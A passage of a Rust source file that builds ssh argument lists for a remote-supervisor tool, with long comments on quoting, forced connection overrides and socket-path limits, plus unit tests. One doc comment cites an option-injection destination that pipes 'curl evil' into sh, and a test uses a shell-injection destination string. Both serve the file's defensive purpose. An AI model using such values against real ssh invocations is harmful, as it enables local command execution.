//! The ssh argv that reaches a remote supervisor, and the one failure of
//! that argv worth translating.
//!
//! Farhelm never speaks ssh itself — it shells out to the user's own
//! `ssh`, which is the whole point of SPEC.md's transport story (their
//! config, their keys, their agent, their jump hosts). A Tensorlake sandbox
//! is the one host reached with a key Farhelm keeps itself ([`SshAccess`]);
//! the user's config still applies to it. The config governs
//! reaching and authenticating to the host; it does not get to forward
//! anything over Farhelm's connections or replace or wrap Farhelm's remote
//! command (see [`CONNECTION_OVERRIDES`]). What is left on this side is
//! text: a vector of arguments, assembled from registry rows the user
//! wrote. That assembly is where this transport's subtlest bug class lives
//! — and it is pure, so the tests below pin it exactly. What CI cannot run
//! is the transport AROUND it: no reachable remote host, no keys, no agent,
//! so a wrong argv would otherwise surface only on a user's machine.
//! Pinning the argv is how that gap is covered.
//!
//! ## Two layers of quoting, neither of them shell-quoting the argv
//!
//! The argv is not exec'd remotely. ssh joins everything after the
//! destination with spaces and hands the resulting STRING to the remote
//! login shell, so the remote command has to be quoted for a shell that
//! runs on another machine. Separately, `-o` values are parsed with
//! ssh_config tokenization and percent expansion, which is a different
//! grammar again. `ssh_control_path_option` handles the second;
//! [`shell_quote`] handles the first.
//!
//! ## The prefix is a security boundary, so it is built in one place
//!
//! `ssh_base_args` owns everything up to and including the destination — the
//! connection overrides, the connection-multiplexing options, the option
//! terminator, and the destination's placement AFTER that terminator. That
//! ordering is what keeps a user-supplied destination from being read as an ssh
//! option (see its docs), so it is stated once here and inherited by every
//! remote command built on top of it. `ssh_stdio_args` builds the steady-state
//! `farhelm internal stdio` proxy; provisioning reuses the prefix for its
//! discovery, reach checks, convergence commands, and payload uploads.
//!
//! ## Two shared connections per host, and why
//!
//! The helm shares one ssh connection (an OpenSSH `ControlMaster`) per host
//! and PURPOSE, not per host: the long-lived supervisor connection rides one
//! master and every provisioning command rides another (see
//! [`SharedConnection`]). The point is to keep Farhelm workable on hosts that
//! restrict how a connection may be used. Every ssh command is one session on
//! its master, and sshd's `MaxSessions` caps how many sessions one connection
//! may carry at a time. With a cap of one, a single shared master spends its
//! only session on `farhelm internal stdio` for as long as the helm is
//! connected, and the master refuses every provisioning command. OpenSSH then
//! falls back to a fresh connection, which on a host that needs an
//! interactive approval for every new login (a second factor, say) cannot
//! succeed under `BatchMode`. With two masters, the supervisor connection and
//! provisioning never compete for one connection's sessions, and a user on
//! such a host can start both masters by hand at the helm's socket paths
//! (SPEC.md "Supported user environments" describes that, best effort).
//! [`manual_master_command`] exposes those paths and overrides as a pasteable
//! command for the help dialog; it never starts a connection.
//!
//! The split applies to every host, not only to restricted ones, so both
//! paths are exercised everywhere. On an ordinary host it costs one more
//! login when provisioning starts with no provisioning master open, and it
//! leaves the supervisor connection's socket name and limits exactly as they
//! were.

use anyhow::Context;

/// ssh settings every Farhelm connection overrides, whatever the user's ssh
/// config says (SPEC.md "Security": the config governs reaching the host,
/// never what rides Farhelm's connection).
///
/// Command-line `-o` values win over the config file, which is the whole
/// mechanism. What each one prevents:
///
/// - `ForwardAgent=no`, `ForwardX11=no`, `ClearAllForwardings=yes`: the
///   supervisor connection stays up around the clock, so a `ForwardAgent
///   yes` (or an X11 or port forward) from a `Host *` block would hand any
///   agent running on that host the user's ssh keys, display or local ports
///   for as long as the helm runs. `ClearAllForwardings` covers
///   `LocalForward`, `RemoteForward` and `DynamicForward` in one setting.
///   It does not affect `ProxyJump`, which runs the jump as a separate
///   `ssh -W` child: checked with a real connection through a jump on
///   localhost (OpenSSH 9.6).
/// - `RemoteCommand=none`: with a `RemoteCommand` in the config, OpenSSH
///   refuses any command given on its command line ("Cannot execute
///   command-line and remote command.") before connecting, so the host
///   could never be added, set up or connected to.
/// - `RequestTTY=no`: a `RequestTTY force` would put a terminal between the
///   supervisor's binary stdio stream and the helm, which rewrites bytes.
/// - `PermitLocalCommand=no`: a `LocalCommand` writes to ssh's own stdout,
///   so its output would land in front of the framed protocol stream.
///
/// The user's keys and agent are still used to AUTHENTICATE; only
/// forwarding the agent to the far side is off. Agent and X11 forwarding are
/// requested per session by the client, so they stay off even on a shared
/// connection (`ControlMaster`) opened before these overrides existed.
///
/// What this list does not cover, deliberately:
///
/// - Port forwards belong to the shared connection's master, which a new client
///   cannot cancel, and the master is a detached process that outlives the helm
///   that started it (a Linux service's stop kills it with the rest of the
///   service; nothing else does). After an upgrade, a helm started within the
///   master's 60-second `ControlPersist` reuses it, which is the ordinary path
///   for the macOS desktop app (quit, install, reopen) and for a helm run by
///   hand, and the long-lived supervisor connection then keeps any port
///   forwards that master set up from the user's config. They last until that
///   master exits: it needs more than 60 seconds with no client attached, so
///   further quick manual restarts keep it alive, and it ends when left unused
///   for over a minute (the helm stopped that long), when its connection to the
///   host drops, or on `ssh -O exit` on its socket. A service manager's restart
///   is no remedy: a master the hand-started helm created is not in the
///   service's process group. Giving the socket a new name would close this
///   upgrade-time window at the permanent cost of one character of the socket-
///   path budget (see [`control_socket`]), so it was not done.
/// - `SessionType none`, `StdinNull yes` and `ForkAfterAuthentication yes`
///   also cut Farhelm off from its remote command, but their override
///   keywords only exist since OpenSSH 8.7, and an unknown `-o` keyword is
///   fatal, so overriding them would break every helm on an older ssh.
///
/// The floor these overrides do set is OpenSSH 7.6 (`RemoteCommand`); an
/// older ssh rejects the whole command line.
const CONNECTION_OVERRIDES: [&str; 6] = [
    "ForwardAgent=no",
    "ForwardX11=no",
    "ClearAllForwardings=yes",
    "RemoteCommand=none",
    "RequestTTY=no",
    "PermitLocalCommand=no",
];

/// `CONNECTION_OVERRIDES` as `-o` argument pairs, followed by `options` as
/// further pairs, ready to precede the option terminator.
fn options_with_overrides(options: &[&str]) -> Vec<String> {
    CONNECTION_OVERRIDES
        .iter()
        .chain(options)
        .flat_map(|option| ["-o".to_string(), (*option).to_string()])
        .collect()
}

/// Which of the helm's two shared ssh connections to a host a command rides.
///
/// Each purpose gets its own `ControlMaster` socket, so the long-lived
/// supervisor session never occupies a session slot provisioning needs (see
/// the module docs for why that matters). Nothing else differs between the
/// two: the connection overrides, `BatchMode`, the option terminator and the
/// destination's placement are identical, because both are the same
/// security boundary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SharedConnection {
    /// The `farhelm internal stdio` proxy that stays up for as long as the
    /// helm is connected to the host's supervisor.
    Supervisor,
    /// Every provisioning step: discovery, reach checks, install, payload
    /// upload, update, repair and uninstall.
    Provisioning,
}

impl SharedConnection {
    /// The socket's file name inside the control directory, still holding
    /// OpenSSH's `%C` token.
    ///
    /// The supervisor connection keeps the bare `%C` it has always had, so
    /// its socket-path budget and the reasoning around renaming it (see
    /// [`CONNECTION_OVERRIDES`]) are unchanged. Provisioning's name is `p%C`:
    /// - a PREFIX, because [`ssh_control_path_option`] only keeps a trailing
    ///   `%C` as an expansion token, and a suffix would turn it into a literal
    ///   that every host's provisioning shared;
    /// - and the two expanded names differ in length (41 characters against
    ///   40), so no provisioning socket can ever share a name with a
    ///   supervisor socket, whatever host either belongs to.
    ///
    /// The extra character is the socket-path budget cost of the split. It
    /// falls on provisioning alone, because [`control_socket`] decides each
    /// purpose's fit separately.
    fn socket_name(self) -> &'static str {
        match self {
            SharedConnection::Supervisor => "%C",
            SharedConnection::Provisioning => "p%C",
        }
    }
}

/// How ssh authenticates to a host and checks its host key, as a plain
/// choice that can travel in a plan or a registry decision
/// ([`crate::store::HostKind::ssh_access`]); [`SshAccess::resolve`] turns
/// it into the files it names.
///
/// Serialized into provisioning plans, where an ordinary ssh host omits it
/// (see `ProvisioningTarget::Ssh`), so plans for existing hosts keep their
/// shape.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum SshAccessKind {
    /// The user's own ssh setup: their keys, agent and known hosts.
    UserConfig,
    /// Farhelm's own Tensorlake key and known-hosts file, on top of the
    /// user's config (see [`crate::tensorlake::ssh`]).
    Tensorlake,
}

impl SshAccessKind {
    /// For `skip_serializing_if`: the default needs no mention in a plan.
    pub(crate) fn is_user_config(&self) -> bool {
        *self == SshAccessKind::UserConfig
    }
}

/// [`SshAccessKind`] with its files resolved: what [`ssh_base_args`] needs
/// to add the right options.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SshAccess {
    /// Nothing beyond the overrides every connection gets; the argv is
    /// byte-for-byte what it was before Tensorlake hosts existed.
    UserConfig,
    /// Farhelm's key and known-hosts file for Tensorlake's gateway: the same
    /// access, and the same option set, the snapshot builder uses
    /// ([`crate::tensorlake::ssh`]).
    Tensorlake(crate::tensorlake::ssh::TensorlakeSshAccess),
}

impl SshAccess {
    /// Resolve `kind` against the helm's state directory, where Farhelm's
    /// Tensorlake key and known-hosts file live. Pure: it names the files
    /// and never creates them, so a dial can never generate a key (only the
    /// user's Create SSH key in Settings does). Fails only when a relative
    /// state directory cannot be made absolute.
    pub(crate) fn resolve(
        kind: SshAccessKind,
        state_dir: &std::path::Path,
    ) -> anyhow::Result<SshAccess> {
        Ok(match kind {
            SshAccessKind::UserConfig => SshAccess::UserConfig,
            SshAccessKind::Tensorlake => SshAccess::Tensorlake(
                crate::tensorlake::ssh::TensorlakeSshAccess::for_state_dir(state_dir)
                    .context("locating Farhelm's Tensorlake ssh key")?,
            ),
        })
    }

    /// This access's own `-o` values, placed after the connection options
    /// and before the option terminator. Empty for [`SshAccess::UserConfig`].
    fn options(&self) -> anyhow::Result<Vec<String>> {
        match self {
            SshAccess::UserConfig => Ok(Vec::new()),
            SshAccess::Tensorlake(access) => access.options().map_err(anyhow::Error::msg),
        }
    }
}

/// The ssh argv prefix shared by every remote command: the options, the
/// terminator, and the destination, with `connection` choosing which of the
/// host's shared connections the command rides.
///
/// **`--` goes before the DESTINATION, not after it**, and that ordering is
/// a security boundary rather than a stylistic choice. A destination is
/// user-supplied text — a registry row anyone with helm access can write,
/// through `POST /api/hosts` or an `--ensure-hosts` file — so a value
/// shaped like
/// `-oProxyCommand=curl evil|sh` is parsed by OpenSSH's own getopt loop as
/// an OPTION and executed — a local command injection with no ssh
/// connection involved at all — for as long as the option terminator sits
/// anywhere after it. Placed first, `--` ends option parsing before ssh
/// ever looks at the destination, and it still covers the remote argv
/// (`--state-dir` in [`ssh_stdio_args`]) that the old placement was
/// protecting.
/// [`crate::store::HelmStore::add_ssh_host`] additionally refuses
/// option-shaped destinations at the registry boundary so the user gets a
/// clear error instead of a puzzling ssh failure; THIS ordering is the
/// actual guard, and it holds for callers that never go through the store.
///
/// The UTF-8 requirement enforced below is specific to this ssh path; the
/// local host's unix-socket transport keeps native `OsString` state paths
/// and still tolerates non-UTF-8 homes (see
/// `farhelm_supervisor::default_state_dir`), so a helm with no ssh rows
/// never meets this requirement at all.
pub(crate) fn ssh_base_args(
    dest: &str,
    control_dir: &std::path::Path,
    connection: SharedConnection,
    access: &SshAccess,
) -> anyhow::Result<Vec<String>> {
    let access_options = access
        .options()?
        .into_iter()
        .flat_map(|option| ["-o".to_string(), option]);
    let Some(control_path) = control_socket(control_dir, connection) else {
        // Too long to bind or unsafe to represent: sharing is an optimization, so ssh
        // runs without it rather than failing every connection. Both
        // options are needed: `ControlMaster=no` only stops ssh creating a
        // master, and without `ControlPath=none` it would still use (or
        // trip over) a ControlPath from the user's own ssh config.
        let mut args =
            options_with_overrides(&["BatchMode=yes", "ControlMaster=no", "ControlPath=none"]);
        args.extend(access_options);
        args.extend(["--".to_string(), dest.to_string()]);
        return Ok(args);
    };
    let control_path = control_path.as_path();
    // This is the last point a local filesystem path is still a `Path`
    // before it is embedded in text handed to ssh. The alternative,
    // `Path::to_string_lossy`, does not fail on a non-UTF-8 path — it
    // silently substitutes replacement characters and produces a
    // *different* path, which ssh would then happily create or connect to
    // a ControlMaster socket under, with no indication anything went
    // wrong. Rejecting loudly here, naming the path, is what makes ssh
    // config values and argv text safe to build from a `Path`: unlike
    // `ControlMsg::cwd` (farhelm-proto's own UTF-8-only wire contract),
    // this path never crosses the protocol at all — the requirement here
    // comes from ssh treating both its `-o` values and its remote argv as
    // text, not from anything upstream.
    let control_path_str = control_path.to_str().with_context(|| {
        // `to_string_lossy`, not `{control_path:?}`: the point of naming
        // the path in the error is so the user can recognize WHICH one is
        // unusable, and Debug's `\xFF`-escaped form is far less
        // recognizable at a glance than the lossy rendering of the parts
        // that are valid UTF-8.
        format!(
            "path {} is not valid UTF-8; ssh's ControlPath option and remote argv are handled \
             as text and cannot represent it — rename it or point --state-dir elsewhere",
            control_path.to_string_lossy()
        )
    })?;
    let control_path = ssh_control_path_option(control_path_str);
    let mut args = options_with_overrides(&[
        "BatchMode=yes",
        "ControlMaster=auto",
        &control_path,
        "ControlPersist=60",
    ]);
    args.extend(access_options);
    // See this function's own docs: the terminator precedes the destination
    // so an option-shaped destination can never be read as an option.
    args.extend(["--".to_string(), dest.to_string()]);
    Ok(args)
}

/// The argv prefix for a one-shot ssh command that never shares a
/// connection: the same overrides and `BatchMode` as [`ssh_base_args`], then
/// `ControlMaster=no` and `ControlPath=none`, then the caller's
/// `extra_options` as further `-o` pairs, then `--` and the destination.
///
/// For destinations whose name can come back attached to a different
/// machine, which a shared master would get wrong: Tensorlake's snapshot
/// builder has a fixed name per recipe, so a `ControlPersist` master still
/// open to the previous builder would carry a new command to a terminated
/// sandbox, where a new channel hangs instead of failing. Both options are
/// needed for the reason [`ssh_base_args`]' unshared branch gives.
///
/// `extra_options` are `Keyword=value` strings the caller built, with any
/// path in them already encoded by [`ssh_config_path_option`]. They come
/// after the overrides, and ssh takes the first value it sees for a keyword,
/// so they cannot undo an override; the terminator rule is the same as
/// [`ssh_base_args`]'.
pub(crate) fn ssh_oneshot_args(dest: &str, extra_options: &[String]) -> Vec<String> {
    let extra: Vec<&str> = extra_options.iter().map(String::as_str).collect();
    let mut options = vec!["BatchMode=yes", "ControlMaster=no", "ControlPath=none"];
    options.extend(extra);
    let mut args = options_with_overrides(&options);
    args.extend(["--".to_string(), dest.to_string()]);
    args
}

/// `Keyword="path"` for an ssh `-o` option whose value is a local path
/// (`IdentityFile`, `UserKnownHostsFile`), encoded for ssh_config's value
/// parser: quotes and backslashes escaped, and every `%` doubled, because
/// those keywords expand percent tokens and a path is never meant to hold
/// one. Unlike [`ssh_control_path_option`], no trailing token survives.
/// The one encoder for these options, shared by Tensorlake hosts and the
/// snapshot builder.
///
/// Refuses a path containing `${`, naming it. OpenSSH expands `${NAME}` in
/// these options even inside config quotes, and has no escape for it: an
/// unset variable makes ssh exit with "invalid environment variable
/// expansion", and a set one silently names another file. A path that
/// cannot be passed literally is therefore an error the user can fix (by
/// moving the state directory), never an argv that means something else.
/// [`control_socket`] makes the same call for the ControlPath, where it can
/// fall back to not sharing; a key file has no such fallback.
///
/// `raw` must already be UTF-8 text; the caller owns that check, as
/// [`ssh_base_args`] does for the control path.
pub(crate) fn ssh_config_path_option(keyword: &str, raw: &str) -> Result<String, String> {
    if raw.contains("${") {
        return Err(format!(
            "path {raw} contains \"${{\", which ssh would expand as an environment variable in \
             its {keyword} option; move Farhelm's state directory (--state-dir) to a path \
             without it"
        ));
    }
    Ok(format!("{keyword}=\"{}\"", escape_config_path(raw)))
}

/// The argv that tells `connection`'s shared master for `dest` to exit
/// (`ssh -O exit`), or `None` when this helm never shares that connection
/// (see [`control_socket`]), so there is no master to stop.
///
/// The same prefix as [`ssh_base_args`] reproduces the same `%C`, which
/// hashes the resolved host, port and user, so the command reaches exactly
/// the master the helm's own clients ride. Needed because a master outlives
/// the sandbox it reaches: once a Tensorlake sandbox is suspended or
/// deleted, a new session on its old master hangs instead of failing, and
/// the master would otherwise linger for its 60-second `ControlPersist`
/// after the last client.
pub(crate) fn ssh_control_exit_args(
    dest: &str,
    control_dir: &std::path::Path,
    connection: SharedConnection,
    access: &SshAccess,
) -> anyhow::Result<Option<Vec<String>>> {
    if control_socket(control_dir, connection).is_none() {
        return Ok(None);
    }
    let mut args = ssh_base_args(dest, control_dir, connection, access)?;
    let terminator = args
        .iter()
        .rposition(|arg| arg == "--")
        .expect("ssh_base_args always ends with the terminator and the destination");
    args.splice(
        terminator..terminator,
        ["-O".to_string(), "exit".to_string()],
    );
    Ok(Some(args))
}

/// The ssh argv for reaching a remote supervisor, as a pure function so
/// the quoting seam is unit-testable — the ssh path as a whole cannot run
/// in CI, and this argv is where its subtlest bug class lives.
///
/// The trailing argv after the destination is not exec'd remotely: ssh
/// joins it with spaces and hands the string to the remote login shell,
/// so anything that may contain spaces (the remote state dir) must be
/// quoted as that shell will parse it, or the path word-splits remotely.
///
/// Everything before the remote command — including the option-terminator
/// placement that makes a hostile destination harmless — is
/// [`ssh_base_args`]' business, not this function's.
pub(crate) fn ssh_stdio_args(
    dest: &str,
    control_dir: &std::path::Path,
    access: &SshAccess,
    remote_farhelm: &str,
    remote_state_dir: Option<&str>,
) -> anyhow::Result<Vec<String>> {
    let mut args = ssh_base_args(dest, control_dir, SharedConnection::Supervisor, access)?;
    args.extend([
        shell_quote(remote_farhelm),
        "internal".to_string(),
        "stdio".to_string(),
    ]);
    if let Some(remote_state) = remote_state_dir {
        args.push("--state-dir".to_string());
        args.push(shell_quote(remote_state));
    }
    if matches!(access, SshAccess::Tensorlake(_)) {
        // Probe the executable itself before passing a new option: an older
        // helper must reach the normal hello/version-skew path, not fail in
        // clap before it can report its protocol. Help never opens a socket;
        // its output is captured so stdout remains a pure protocol stream.
        let command_start = args
            .iter()
            .position(|arg| arg == "--")
            .expect("ssh terminator")
            + 2;
        let command = args[command_start..].join(" ");
        let probe = format!("{} internal stdio --help", shell_quote(remote_farhelm));
        args.truncate(command_start);
        args.push(format!(
            "case \"$({probe} 2>/dev/null)\" in *--stdin-idle-limit-secs*) exec {command} --stdin-idle-limit-secs 120 ;; *) exec {command} ;; esac"
        ));
    }
    Ok(args)
}

/// Encode one word for the remote login shell (OpenSSH hands the joined
/// command to it) with no shell syntax left active; see
/// [`farhelm_proto::text::shell_quote`] for why this never leaves a word bare.
pub(crate) use farhelm_proto::text::shell_quote;

/// The longest Unix socket path OpenSSH can bind: `sun_path` less its
/// terminating NUL (108 bytes on Linux, 104 on macOS).
#[cfg(target_os = "macos")]
const MAX_SOCKET_PATH: usize = 103;
#[cfg(not(target_os = "macos"))]
const MAX_SOCKET_PATH: usize = 107;

/// What OpenSSH appends while it becomes a connection master: it binds
/// `<ControlPath>.<16 random characters>` first and renames it into place.
const MASTER_TEMP_SUFFIX: usize = 17;

/// `%C` is a SHA-1 in hex; fit checks and their explanations share this size.
const EXPANDED_TOKEN: usize = 40;

/// Compose an interactive master with the exact connection boundary Farhelm uses.
///
/// The user runs this on the helm's machine, under its account. Shell quoting
/// protects each local argument; ControlPath separately uses OpenSSH's config
/// quoting. A missing sharing socket is explained rather than offering a command
/// that authenticates but never helps the helm. No remote session is opened,
/// leaving MaxSessions available for Farhelm's own clients.
pub(crate) fn manual_master_command(
    dest: &str,
    control_dir: &std::path::Path,
    connection: SharedConnection,
) -> Result<String, String> {
    // Automatic clients inherit the helm's cwd. Preserve it for a relative
    // --state-dir, rather than silently opening a socket in the user's terminal
    // directory or expanding its spelling beyond the socket-path length gate.
    let cwd = if control_dir.is_relative() {
        std::env::current_dir()
            .map_err(|error| format!("cannot read the helm's working directory: {error}"))?
    } else {
        std::path::PathBuf::from("/")
    };
    manual_master_command_from(dest, control_dir, connection, &cwd)
}

/// Keep the directory context explicit for pure composition and portability
/// tests; no test changes the harness process's own working directory.
fn manual_master_command_from(
    dest: &str,
    control_dir: &std::path::Path,
    connection: SharedConnection,
    working_dir: &std::path::Path,
) -> Result<String, String> {
    let path = control_dir.to_str().ok_or_else(|| format!(
        "{} is not UTF-8; ssh cannot represent this helm's state directory. Hosts needing 2FA cannot share this connection.",
        control_dir.to_string_lossy(),
    ))?;
    let socket = control_socket(control_dir, connection).ok_or_else(|| {
        if path.contains("${") {
            format!("{path} contains ${{; ssh would expand it. Hosts needing 2FA cannot share this connection.")
        } else {
            let extra = connection.socket_name().len() - "%C".len();
            let required = control_dir.as_os_str().len() + 1 + extra + EXPANDED_TOKEN + MASTER_TEMP_SUFFIX;
            format!("{path} needs {required} bytes for this connection's socket and temporary name; the limit is {MAX_SOCKET_PATH} bytes. Hosts needing 2FA cannot share this connection.")
        }
    })?;
    let control_path =
        ssh_control_path_option(socket.to_str().expect("directory checked as UTF-8"));
    // The user's master must permit prompts and stay up before any client
    // attaches; ordinary helm clients instead authenticate noninteractively.
    let mut args = vec!["ssh".to_string(), "-N".to_string(), "-f".to_string()];
    args.extend(options_with_overrides(&[
        "BatchMode=no",
        "ControlMaster=yes",
        &control_path,
        "ControlPersist=yes",
    ]));
    args.extend(["--".to_string(), dest.to_string()]);
    let command = args
        .iter()
        .map(|arg| shell_quote(arg))
        .collect::<Vec<_>>()
        .join(" ");
    if control_dir.is_relative() {
        let cwd = working_dir.to_str().ok_or_else(|| "the helm's working directory is not UTF-8; its relative state path cannot be represented in a shell command".to_string())?;
        Ok(format!("(cd {} && {command})", shell_quote(cwd)))
    } else {
        Ok(command)
    }
}

/// The connection-sharing socket for `connection` inside `control_dir`, as a
/// ControlPath still holding OpenSSH's `%C` token, or `None` when its
/// expansion would be too long to bind or would interpret literal `${...}`.
///
/// `%C` is kept because it is a hash of the resolved connection (local
/// host, remote host, port, user), so a master is only ever reused for the
/// same resolved target; a name derived from the destination string alone
/// would let an ssh-config alias that now points elsewhere reuse a master
/// to the old host. The name is nothing but `%C`, because OpenSSH treats a
/// socket path over the limit as fatal: the old `ssh-cm-%C` made every ssh
/// host fail for usernames over 15 characters on Linux or 10 on macOS with
/// the default state directory. The bare name fits the default state
/// directory for usernames up to 22 characters on Linux and 17 on macOS;
/// longer ones, which SPEC.md "Supported user environments" still requires
/// to work, run without connection sharing (see [`ssh_base_args`]).
///
/// Those limits are the supervisor connection's. Provisioning's name is one
/// character longer (see [`SharedConnection::socket_name`]), so its limits
/// are 21 and 16, and each purpose falls back on its own: at exactly the
/// supervisor's limit, the supervisor connection still shares while
/// provisioning runs without sharing.
pub(crate) fn control_socket(
    control_dir: &std::path::Path,
    connection: SharedConnection,
) -> Option<std::path::PathBuf> {
    control_socket_within(control_dir, connection, MAX_SOCKET_PATH)
}

/// [`control_socket`] against an explicit socket-path limit, so both
/// platforms' limits can be tested on either.
fn control_socket_within(
    control_dir: &std::path::Path,
    connection: SharedConnection,
    max_socket_path: usize,
) -> Option<std::path::PathBuf> {
    // OpenSSH expands ${...} even inside its quoted ControlPath. A literal
    // directory with that spelling cannot safely name a shared socket.
    if control_dir.to_str().is_some_and(|path| path.contains("${")) {
        return None;
    }
    let name = connection.socket_name();
    let literal = name.len() - "%C".len();
    let expanded = control_dir.as_os_str().len() + 1 + literal + EXPANDED_TOKEN;
    (expanded + MASTER_TEMP_SUFFIX <= max_socket_path).then(|| control_dir.join(name))
}

/// Encode a ControlPath for OpenSSH's config-value parser.
///
/// This is not shell quoting: `-o` values use ssh_config tokenization,
/// then expand percent tokens. Quotes and backslashes need config
/// escapes, while user-supplied `%` must become `%%`; only the final `%C`
/// added by Farhelm (see [`control_socket`]) remains an expansion token. Takes `&str` rather than
/// `&Path`: the UTF-8 check belongs to the caller (`ssh_base_args`), the
/// one actual boundary where a local `Path` becomes ssh-config text — this
/// function is a pure string encoder with nothing left to reject.
fn ssh_control_path_option(raw: &str) -> String {
    let (prefix, suffix) = raw
        .strip_suffix("%C")
        .map_or((raw, ""), |prefix| (prefix, "%C"));
    format!("ControlPath=\"{}{suffix}\"", escape_config_path(prefix))
}

/// Config quoting for a path inside double quotes: backslashes and quotes
/// escaped for the tokenizer, `%` doubled so percent expansion leaves it.
fn escape_config_path(raw: &str) -> String {
    raw.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('%', "%%")
}

#[cfg(test)]
mod tests {
    use super::SharedConnection;

    /// Both hand-started masters must carry every transport override and the
    /// same config-quoted socket as the corresponding ordinary helm client.
    /// The shell inverse catches word splitting and active destination syntax.
    #[farhelm_testtrace::test]
    fn manual_master_commands_preserve_the_connection_boundary() {
        let dir = std::path::Path::new("/tmp/a 'b\"c\\%d");
        let dest = "user@host'; echo $bad";
        for kind in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let command = super::manual_master_command(dest, dir, kind).unwrap();
            let argv = shell_words::split(&command).unwrap();
            assert_eq!(&argv[..3], ["ssh", "-N", "-f"]);
            assert_eq!(&argv[argv.len() - 2..], ["--", dest]);
            for option in super::CONNECTION_OVERRIDES {
                assert!(argv.windows(2).any(|pair| pair == ["-o", option]));
            }
            for option in ["BatchMode=no", "ControlMaster=yes", "ControlPersist=yes"] {
                assert!(argv.windows(2).any(|pair| pair == ["-o", option]));
            }
            let ordinary =
                super::ssh_base_args(dest, dir, kind, &super::SshAccess::UserConfig).unwrap();
            let ordinary_from_manual = argv[3..]
                .iter()
                .map(|arg| match arg.as_str() {
                    "BatchMode=no" => "BatchMode=yes".to_string(),
                    "ControlMaster=yes" => "ControlMaster=auto".to_string(),
                    "ControlPersist=yes" => "ControlPersist=60".to_string(),
                    _ => arg.clone(),
                })
                .collect::<Vec<_>>();
            assert_eq!(
                ordinary_from_manual, ordinary,
                "changing only the interactive-master choices must recover the helm's own argv"
            );
            let path = argv
                .iter()
                .find(|arg| arg.starts_with("ControlPath="))
                .unwrap();
            assert!(
                ordinary.contains(path),
                "manual and automatic clients must share a socket"
            );
            assert_eq!(
                path,
                &super::ssh_control_path_option(
                    super::control_socket(dir, kind).unwrap().to_str().unwrap()
                )
            );
        }
    }

    /// Relative ControlPaths inherit the helm's cwd, not the directory where
    /// the user pastes help. A real shell and private argv spy distinguish a
    /// quoted cwd subshell from merely quoting the relative socket string.
    #[cfg(unix)]
    #[farhelm_testtrace::test]
    fn manual_master_preserves_relative_state_directory_context() {
        use std::os::unix::fs::PermissionsExt;
        let fixture = tempfile::tempdir().unwrap();
        let helm = fixture.path().join("helm 'working directory");
        let terminal = fixture.path().join("terminal");
        let bin = fixture.path().join("bin");
        for dir in [&helm, &terminal, &bin] {
            std::fs::create_dir(dir).unwrap();
        }
        let ssh = bin.join("ssh");
        std::fs::write(&ssh, "#!/bin/sh\npwd\nprintf '%s\\n' \"$@\"\n").unwrap();
        std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
        assert_ne!(
            helm, terminal,
            "premise: the user's terminal has a different cwd"
        );
        for kind in [SharedConnection::Supervisor, SharedConnection::Provisioning] {
            let command = super::manual_master_command_from(
                "example",
                std::path::Path::new("state"),
                kind,
                &helm,
            )
            .unwrap();
            let output = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(command)
                .current_dir(&terminal)
                .env("PATH", &bin)
                .output()
                .unwrap();
            assert!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
            let text = String::from_utf8(output.stdout).unwrap();
            let lines = text.lines().collect::<Vec<_>>();
            assert_eq!(lines[0], helm.to_str().unwrap());
            assert!(lines.contains(
                &super::ssh_control_path_option(&format!("state/{}", kind.socket_name())).as_str()
            ));
            assert_eq!(&lines[lines.len() - 2..], ["--", "example"]);
        }
    }

    /// A setup socket can exceed the limit while sessions still fit. The
    /// explanation must use the same byte arithmetic as the actual fit gate.
    #[farhelm_testtrace::test]
    fn manual_master_help_explains_unshareable_paths() {
        let length = super::MAX_SOCKET_PATH - 1 - super::EXPANDED_TOKEN - super::MASTER_TEMP_SUFFIX;
        let dir = std::path::PathBuf::from("x".repeat(length));
        assert!(
            super::control_socket(&dir, SharedConnection::Supervisor).is_some(),
            "premise: sessions fits exactly"
        );
        assert!(
            super::control_socket(&dir, SharedConnection::Provisioning).is_none(),
            "premise: setup is one byte too long"
        );
        assert!(super::manual_master_command("host", &dir, SharedConnection::Supervisor).is_ok());
        let error =
            super::manual_master_command("host", &dir, SharedConnection::Provisioning).unwrap_err();
        assert!(error.contains(&format!("needs {} bytes", super::MAX_SOCKET_PATH + 1)));
        assert!(error.contains(&format!("limit is {} bytes", super::MAX_SOCKET_PATH)));
        assert!(error.contains(&dir.to_string_lossy().to_string()));
        let expanded = super::manual_master_command(
            "host",
            std::path::Path::new("/tmp/${literal}"),
            SharedConnection::Supervisor,
        )
        .unwrap_err();
        assert!(expanded.contains("ssh would expand it"));
        #[cfg(unix)]
        {
            use std::os::unix::ffi::OsStringExt;
            let dir =
                std::path::PathBuf::from(std::ffi::OsString::from_vec(b"/tmp/a\xff".to_vec()));
            assert!(
                super::manual_master_command("host", &dir, SharedConnection::Supervisor)
                    .unwrap_err()
                    .contains("not UTF-8")
            );
        }
    }

    /// The remote state dir rides ssh's trailing argv, which the remote
    /// login shell re-parses — a path with spaces must survive as one
    /// token. `shell_words::split` is the inverse oracle for the quoting.
    /// ssh tokenizes `-o` values like config-file lines, so a local
    /// state dir containing a space must arrive quoted — otherwise every
    /// `--ssh` connection from that state dir dies at startup.
    #[farhelm_testtrace::test]
    fn ssh_args_quote_a_control_path_containing_spaces() {
        let dir = std::path::Path::new("/home/u/my state");
        let args = super::ssh_stdio_args(
            "user@host",
            dir,
            &super::SshAccess::UserConfig,
            "farhelm",
            None,
        )
        .unwrap();
        assert!(
            args.contains(&"ControlPath=\"/home/u/my state/%C\"".to_string()),
            "ControlPath must be quoted for ssh's own parser: {args:?}"
        );
    }

    /// OpenSSH expands percent tokens after parsing `-o`, so a state
    /// directory containing `%d` must stay literal while Farhelm's final
    /// `%C` remains active. Quotes and backslashes exercise the separate
    /// config-tokenization layer; shell quoting would not protect them.
    #[farhelm_testtrace::test]
    fn ssh_args_escape_control_path_config_syntax() {
        let dir = std::path::Path::new("/home/u/%d/\"quoted\"/back\\slash");
        let args = super::ssh_stdio_args(
            "user@host",
            dir,
            &super::SshAccess::UserConfig,
